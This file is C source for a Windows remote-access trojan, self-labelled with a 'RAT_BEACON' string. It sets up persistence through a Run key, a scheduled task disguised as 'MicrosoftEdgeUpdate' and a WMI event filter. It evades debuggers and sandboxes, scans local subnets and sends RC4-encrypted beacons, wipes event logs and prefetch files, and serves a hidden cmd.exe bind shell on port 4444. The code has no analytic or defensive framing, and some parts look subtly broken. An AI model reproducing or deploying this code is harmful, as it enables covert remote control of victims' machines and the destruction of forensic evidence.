#define _WIN32_WINNT 0x0600
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <iphlpapi.h>
#include <tlhelp32.h>
#include <stdio.h>
#include <stdlib.h>
#include <time.h>

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "iphlpapi.lib")
#pragma comment(lib, "ntdll.lib")

#define PORT 4444
#define MAX_CLIENTS 64
#define RC4_KEY "s3cr3t_k3y_2024"

void rc4_crypt(unsigned char* data, int len, char* key) {
    unsigned char s[256];
    int i, j = 0, t;
    int keylen = strlen(key);
    for (i = 0; i < 256; i++) s[i] = i;
    for (i = 0; i < 256; i++) {
        j = (j + s[i] + key[i % keylen]) & 0xFF;
        t = s[i]; s[i] = s[j]; s[j] = t;
    }
    i = j = 0;
    for (int k = 0; k < len; k++) {
        i = (i + 1) & 0xFF;
        j = (j + s[i]) & 0xFF;
        t = s[i]; s[i] = s[j]; s[j] = t;
        data[k] ^= s[(s[i] + s[j]) & 0xFF];
    }
}

BOOL create_process_w(const wchar_t* cmdline) {
    STARTUPINFOW si = {0};
    PROCESS_INFORMATION pi = {0};
    si.cb = sizeof(si);
    BOOL result = CreateProcessW(NULL, (wchar_t*)cmdline, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    if (result) {
        WaitForSingleObject(pi.hProcess, 2000);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }
    return result;
}

DWORD WINAPI persistence_thread(LPVOID) {
    HKEY hKey;
    wchar_t path[MAX_PATH];
    GetModuleFileNameW(NULL, path, MAX_PATH);
    if (RegOpenKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        RegSetValueExW(hKey, L"WindowsUpdate", 0, REG_SZ, (BYTE*)path, (wcslen(path)+1)*sizeof(wchar_t));
        RegCloseKey(hKey);
    }
    wchar_t cmd[1024];
    swprintf(cmd, 1024, L"schtasks /create /tn \"MicrosoftEdgeUpdate\" /tr \"%s\" /sc onlogon /f /ru SYSTEM", path);
    if (!create_process_w(cmd)) {
        swprintf(cmd, 1024, L"schtasks /create /tn \"MicrosoftEdgeUpdate\" /tr \"%s\" /sc onlogon /f", path);
        create_process_w(cmd);
    }
    swprintf(cmd, 1024, L"wmic /namespace:\\\\root\\subscription path __EventFilter create name=\"StartupFilter\", EventNamespace=\"root\\\\cimv2\", Query=\"SELECT * FROM Win32_ProcessStartTrace WHERE ProcessName='explorer.exe'\"");
    create_process_w(cmd);
    return 0;
}

BOOL anti_debug() {
    if (IsDebuggerPresent()) return TRUE;
    __try { __debugbreak(); } __except(EXCEPTION_EXECUTE_HANDLER) { return TRUE; }
    PEB* peb = (PEB*)__readgsqword(0x60);
    if (peb->NtGlobalFlag & 0x70) return TRUE;
    SYSTEM_INFO si;
    GetSystemInfo(&si);
    if (si.dwNumberOfProcessors < 2) return TRUE;
    MEMORYSTATUSEX mem;
    mem.dwLength = sizeof(mem);
    GlobalMemoryStatusEx(&mem);
    if (mem.ullTotalPhys < 1000000000) return TRUE;
    LARGE_INTEGER start, end, freq;
    QueryPerformanceFrequency(&freq);
    QueryPerformanceCounter(&start);
    Sleep(5000);
    QueryPerformanceCounter(&end);
    if ((end.QuadPart - start.QuadPart) < 4000 * freq.QuadPart / 1000) return TRUE;
    return FALSE;
}

BOOL is_admin() {
    SID_IDENTIFIER_AUTHORITY NtAuthority = SECURITY_NT_AUTHORITY;
    PSID AdminGroup;
    BOOL result = AllocateAndInitializeSid(&NtAuthority, 2, SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS, 0,0,0,0,0,0, &AdminGroup);
    if (result) {
        result = CheckTokenMembership(NULL, AdminGroup, &result);
        FreeSid(AdminGroup);
    }
    return result;
}

void get_all_subnets(char subnets[10][16], int* count) {
    *count = 0;
    DWORD dwSize = 0;
    GetAdaptersInfo(NULL, &dwSize);
    PIP_ADAPTER_INFO pAdapterInfo = (PIP_ADAPTER_INFO)malloc(dwSize);
    if (GetAdaptersInfo(pAdapterInfo, &dwSize) != NO_ERROR) {
        free(pAdapterInfo);
        strcpy(subnets[0], "192.168.1.");
        *count = 1;
        return;
    }
    PIP_ADAPTER_INFO pAdapter = pAdapterInfo;
    while (pAdapter && *count < 10) {
        char* ip = pAdapter->IpAddressList.IpAddress.String;
        if (ip && strstr(ip, ".")) {
            char* p = strrchr(ip, '.');
            if (p) {
                strncpy(subnets[*count], ip, p - ip + 1);
                subnets[*count][p - ip + 1] = '\0';
                (*count)++;
            }
        }
        pAdapter = pAdapter->Next;
    }
    free(pAdapterInfo);
    if (*count == 0) {
        strcpy(subnets[0], "192.168.1.");
        *count = 1;
    }
}

DWORD WINAPI scanner_thread(LPVOID) {
    char subnets[10][16];
    int count;
    get_all_subnets(subnets, &count);
    for (int s = 0; s < count; s++) {
        for (int i = 1; i < 255; i++) {
            char target[20];
            snprintf(target, sizeof(target), "%s%d", subnets[s], i);
            SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
            if (sock == INVALID_SOCKET) continue;
            struct sockaddr_in dest;
            dest.sin_family = AF_INET;
            dest.sin_port = htons(PORT);
            inet_pton(AF_INET, target, &dest.sin_addr);
            u_long mode = 1;
            ioctlsocket(sock, FIONBIO, &mode);
            connect(sock, (struct sockaddr*)&dest, sizeof(dest));
            fd_set fdw;
            FD_ZERO(&fdw);
            FD_SET(sock, &fdw);
            struct timeval tv = {0, 50000};
            if (select(0, NULL, &fdw, NULL, &tv) > 0) {
                char beacon[] = "RAT_BEACON";
                rc4_crypt((unsigned char*)beacon, sizeof(beacon), RC4_KEY);
                send(sock, beacon, sizeof(beacon), 0);
            }
            closesocket(sock);
            Sleep(10);
        }
    }
    return 0;
}

DWORD WINAPI clear_thread(LPVOID) {
    Sleep(5000);
    create_process_w(L"wevtutil cl System");
    create_process_w(L"wevtutil cl Security");
    create_process_w(L"wevtutil cl Application");
    create_process_w(L"del /f /q C:\\Windows\\Prefetch\\*.pf");
    return 0;
}

DWORD WINAPI shell_handler(LPVOID lpParam) {
    SOCKET client = (SOCKET)lpParam;
    char banner[] = "SHELL_READY\n";
    rc4_crypt((unsigned char*)banner, sizeof(banner), RC4_KEY);
    send(client, banner, sizeof(banner), 0);
    STARTUPINFOW si = {0};
    PROCESS_INFORMATION pi = {0};
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES;
    si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)client;
    if (CreateProcessW(NULL, L"cmd.exe", NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        WaitForSingleObject(pi.hProcess, INFINITE);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }
    closesocket(client);
    return 0;
}

DWORD WINAPI listener_thread(LPVOID) {
    SOCKET listen_sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (listen_sock == INVALID_SOCKET) return 1;
    int reuse = 1;
    setsockopt(listen_sock, SOL_SOCKET, SO_REUSEADDR, (char*)&reuse, sizeof(reuse));
    struct sockaddr_in server;
    server.sin_family = AF_INET;
    server.sin_port = htons(PORT);
    server.sin_addr.s_addr = INADDR_ANY;
    if (bind(listen_sock, (struct sockaddr*)&server, sizeof(server)) == SOCKET_ERROR) {
        closesocket(listen_sock); return 1;
    }
    if (listen(listen_sock, MAX_CLIENTS) == SOCKET_ERROR) {
        closesocket(listen_sock); return 1;
    }
    while (1) {
        SOCKET client = accept(listen_sock, NULL, NULL);
        if (client != INVALID_SOCKET) {
            CreateThread(NULL, 0, shell_handler, (LPVOID)client, 0, NULL);
        } else {
            Sleep(1000);
        }
    }
    closesocket(listen_sock);
    return 0;
}

int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmdLine, int nShow) {
    if (anti_debug()) ExitProcess(0);
    HANDLE hMutex = CreateMutexW(NULL, TRUE, L"Global\\MicrosoftEdgeUpdateMutex");
    if (GetLastError() == ERROR_ALREADY_EXISTS) ExitProcess(0);
    WSADATA wsa;
    WSAStartup(MAKEWORD(2,2), &wsa);
    CreateThread(NULL, 0, persistence_thread, NULL, 0, NULL);
    CreateThread(NULL, 0, scanner_thread, NULL, 0, NULL);
    CreateThread(NULL, 0, clear_thread, NULL, 0, NULL);
    CreateThread(NULL, 0, listener_thread, NULL, 0, NULL);
    while (1) Sleep(60000);
    WSACleanup();
    return 0;
}
